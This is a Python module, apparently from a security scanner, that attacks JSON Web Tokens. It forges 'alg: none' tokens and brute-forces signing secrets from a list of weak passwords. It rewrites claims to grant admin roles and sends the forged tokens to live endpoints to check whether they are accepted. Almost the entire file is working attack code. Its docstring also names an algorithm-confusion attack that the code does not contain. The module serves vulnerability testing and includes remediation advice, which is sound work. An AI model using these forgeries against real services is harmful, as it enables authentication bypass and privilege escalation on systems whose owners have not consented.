# janus/core/jwt_attacks.py
"""
JWT Attack Module.
Tests for common JWT vulnerabilities.
"""

from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import json
import base64
import hmac
import hashlib
import requests
from copy import deepcopy


@dataclass
class JWTAttackResult:
    """Result of a JWT attack attempt."""
    attack_type: str
    vulnerable: bool
    original_token: str
    forged_token: str
    confidence: float
    evidence: str
    recommendation: str
    response_status: Optional[int] = None
    response_body: Optional[Any] = None


class JWTAttacker:
    """
    Tests for common JWT vulnerabilities.
    
    Attacks:
    1. Algorithm None - Change alg to 'none' and remove signature
    2. Algorithm Confusion - RS256 -> HS256 with public key as secret
    3. Weak Secret Brute Force - Try common weak secrets
    4. Claim Manipulation - Modify user ID, role, etc.
    """
    
    # Common weak JWT secrets to try
    COMMON_SECRETS: List[str] = [
        "secret", "password", "123456", "changeme", "jwt_secret",
        "your-256-bit-secret", "your-secret-key", "secretkey",
        "supersecret", "admin", "test", "development", "dev",
        "qwerty", "key", "private", "jwt", "token", "auth",
        "HS256", "secret123", "password123", "letmein",
        "1234567890", "abcdefghijklmnop", "",  # Empty secret
        " ",  # Space
        "null", "undefined", "none",
    ]
    
    def __init__(self):
        pass
    
    def _base64url_decode(self, data: str) -> bytes:
        """Decode base64url without padding."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)
    
    def _base64url_encode(self, data: bytes) -> str:
        """Encode to base64url without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
    
    def decode_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
        """
        Decode a JWT without verification.
        Returns: (header, payload, signature)
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None
            
            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            print(f"[!] JWT decode error: {e}")
            return None, None, None
    
    def _sign_hs256(self, header: Dict, payload: Dict, secret: str) -> str:
        """Sign a JWT with HS256."""
        header_b64 = self._base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = self._base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        
        signature_b64 = self._base64url_encode(signature)
        return f"{message}.{signature_b64}"
    
    def attack_alg_none(self, token: str) -> JWTAttackResult:
        """
        Algorithm None Attack.
        Changes the algorithm to 'none' and removes the signature.
        """
        header, payload, sig = self.decode_jwt(token)
        if not header or not payload:
            return JWTAttackResult(
                attack_type="alg_none",
                vulnerable=False,
                original_token=token,
                forged_token="",
                confidence=0.0,
                evidence="Could not decode JWT",
                recommendation=""
            )
        
        # Forge with alg: none
        forged_header = deepcopy(header)
        forged_header['alg'] = 'none'
        
        header_b64 = self._base64url_encode(json.dumps(forged_header, separators=(',', ':')).encode())
        payload_b64 = self._base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        
        # Try both with empty signature and no signature
        forged_tokens = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}",
        ]
        
        return JWTAttackResult(
            attack_type="alg_none",
            vulnerable=False,  # Will be determined by test_endpoint
            original_token=token,
            forged_token=forged_tokens[0],
            confidence=0.0,
            evidence="Forged token with alg:none generated - test against endpoint",
            recommendation="Reject tokens with alg='none'. Use a whitelist of allowed algorithms."
        )
    
    def attack_weak_secret(self, token: str) -> List[JWTAttackResult]:
        """
        Weak Secret Brute Force Attack.
        Tries common weak secrets to forge tokens.
        """
        header, payload, original_sig = self.decode_jwt(token)
        if not header or not payload:
            return []
        
        if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            return [JWTAttackResult(
                attack_type="weak_secret",
                vulnerable=False,
                original_token=token,
                forged_token="",
                confidence=0.0,
                evidence=f"Algorithm is {header.get('alg')}, not HMAC-based",
                recommendation=""
            )]
        
        results = []
        
        for secret in self.COMMON_SECRETS:
            try:
                # Sign with this secret
                forged = self._sign_hs256(header, payload, secret)
                
                # Check if signature matches
                forged_sig = forged.split('.')[-1]
                if forged_sig == original_sig:
                    results.append(JWTAttackResult(
                        attack_type="weak_secret",
                        vulnerable=True,
                        original_token=token,
                        forged_token=forged,
                        confidence=0.99,
                        evidence=f"CRITICAL: JWT secret cracked! Secret is: '{secret}'",
                        recommendation="Use a strong, random secret (256+ bits). Rotate immediately."
                    ))
                    break  # Found it!
            except Exception:
                continue
        
        if not results:
            results.append(JWTAttackResult(
                attack_type="weak_secret",
                vulnerable=False,
                original_token=token,
                forged_token="",
                confidence=0.0,
                evidence=f"Tested {len(self.COMMON_SECRETS)} common secrets - none matched",
                recommendation=""
            ))
        
        return results
    
    def attack_claim_manipulation(self, token: str, 
                                   claim_modifications: Dict[str, Any] = None) -> JWTAttackResult:
        """
        Claim Manipulation Attack.
        Modifies payload claims (requires a test endpoint to verify).
        """
        header, payload, sig = self.decode_jwt(token)
        if not header or not payload:
            return JWTAttackResult(
                attack_type="claim_manipulation",
                vulnerable=False,
                original_token=token,
                forged_token="",
                confidence=0.0,
                evidence="Could not decode JWT",
                recommendation=""
            )
        
        # Default modifications to try
        if not claim_modifications:
            claim_modifications = {}
            
            # Try to escalate privileges
            if 'role' in payload:
                claim_modifications['role'] = 'admin'
            if 'roles' in payload:
                claim_modifications['roles'] = ['admin']
            if 'admin' in payload:
                claim_modifications['admin'] = True
            if 'is_admin' in payload:
                claim_modifications['is_admin'] = True
            if 'user_id' in payload or 'sub' in payload:
                claim_modifications['user_id'] = 1
                claim_modifications['sub'] = '1'
        
        # Apply modifications
        forged_payload = deepcopy(payload)
        forged_payload.update(claim_modifications)
        
        # Re-encode (signature will be invalid without the secret)
        header_b64 = self._base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = self._base64url_encode(json.dumps(forged_payload, separators=(',', ':')).encode())
        
        # Keep original signature (won't work but shows the attempt)
        forged_token = f"{header_b64}.{payload_b64}.{sig}"
        
        return JWTAttackResult(
            attack_type="claim_manipulation",
            vulnerable=False,  # Needs testing
            original_token=token,
            forged_token=forged_token,
            confidence=0.0,
            evidence=f"Modified claims: {list(claim_modifications.keys())} - test against endpoint",
            recommendation="Validate all claims server-side. Don't trust client-provided claims."
        )
    
    def analyze_jwt(self, token: str) -> Dict[str, Any]:
        """
        Analyze a JWT and return security findings.
        """
        header, payload, sig = self.decode_jwt(token)
        if not header or not payload:
            return {"error": "Invalid JWT format"}
        
        findings = {
            "header": header,
            "payload": payload,
            "algorithm": header.get('alg', 'unknown'),
            "security_issues": [],
            "recommendations": []
        }
        
        # Check algorithm
        alg = header.get('alg', '').upper()
        if alg == 'NONE':
            findings["security_issues"].append("CRITICAL: Algorithm is 'none' - signature not verified!")
        elif alg in ['HS256', 'HS384', 'HS512']:
            findings["security_issues"].append("Uses symmetric algorithm - vulnerable if secret is weak")
        
        # Check for sensitive data in payload
        sensitive_keys = ['password', 'secret', 'api_key', 'credit_card', 'ssn']
        for key in payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                findings["security_issues"].append(f"Sensitive data in payload: {key}")
        
        # Check expiration
        if 'exp' not in payload:
            findings["security_issues"].append("No expiration (exp) claim - token never expires!")
            findings["recommendations"].append("Add an expiration claim to limit token lifetime")
        
        # Check issuer/audience
        if 'iss' not in payload:
            findings["recommendations"].append("Add issuer (iss) claim for token validation")
        if 'aud' not in payload:
            findings["recommendations"].append("Add audience (aud) claim to prevent token misuse")
        
        return findings
    
    def test_endpoint(self, endpoint: str, original_token: str, 
                      forged_token: str, method: str = "GET") -> JWTAttackResult:
        """
        Test a forged JWT against an endpoint.
        """
        try:
            # Test with forged token
            response = requests.request(
                method,
                endpoint,
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=10
            )
            
            # Analyze result
            if response.status_code in [200, 201]:
                return JWTAttackResult(
                    attack_type="endpoint_test",
                    vulnerable=True,
                    original_token=original_token,
                    forged_token=forged_token,
                    confidence=0.95,
                    evidence=f"Forged token ACCEPTED! Status: {response.status_code}",
                    recommendation="Validate JWT signatures properly. Reject 'none' algorithm.",
                    response_status=response.status_code,
                    response_body=response.text[:500]
                )
            else:
                return JWTAttackResult(
                    attack_type="endpoint_test",
                    vulnerable=False,
                    original_token=original_token,
                    forged_token=forged_token,
                    confidence=0.0,
                    evidence=f"Forged token rejected with status {response.status_code}",
                    recommendation="",
                    response_status=response.status_code
                )
                
        except requests.RequestException as e:
            return JWTAttackResult(
                attack_type="endpoint_test",
                vulnerable=False,
                original_token=original_token,
                forged_token=forged_token,
                confidence=0.0,
                evidence=f"Request failed: {str(e)}",
                recommendation=""
            )
